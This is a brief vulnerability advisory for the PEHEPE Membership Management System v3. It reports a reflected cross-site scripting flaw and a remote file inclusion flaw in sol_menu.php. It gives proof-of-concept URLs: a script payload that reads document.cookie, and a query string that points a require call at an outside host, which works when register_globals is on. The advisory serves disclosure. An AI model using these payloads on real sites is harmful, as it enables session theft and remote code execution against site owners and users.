- Advisory: PEHEPE Membership Management System Multiple Vulnerabilities
- Author: Yunus Emre Yilmaz -- mail[at]yunusemreyilmaz(dot)com

- Application: PEHEPE MemberShip Management System (http://www.pehepe.org/UYEL&#304;K3)
- Affected Version : v3 ( maybe older versions..)
- Risk : Critical

-- Details[0] : XSS Vulnerability
   An attacker can manupulate the value of $kul_adi, if s/he opens sol_menu.php directly.
Sol_menu.php is an included page, but the attacker can access it directly. So, the value of $kul_adi 
can be changed from the address bar.

-- Proof of Concept:
http://target_site/script_path/sol_menu.php?kuladi="><script>alert(document.cookie)</script>

-- Details[1] :Remote Code Execution Vulnerability
 There is a "require" command in sol_menu.php. The attacker can bypass the constant UYE_SEVIYE using a , querystring like "misafir[]=UYE_SEVIYE". So the remote code is executing. As a result, the attacker can change the value of the first parameter of the require function which is named as uye_klasor.(dir for remote url)

-- Proof Of Concept:
sol_menu.php?uye_klasor=http://www.example.org&misafir[]=UYE_SEVIYE

-- Note : For using these vulnerabilities, register_globals must be on.
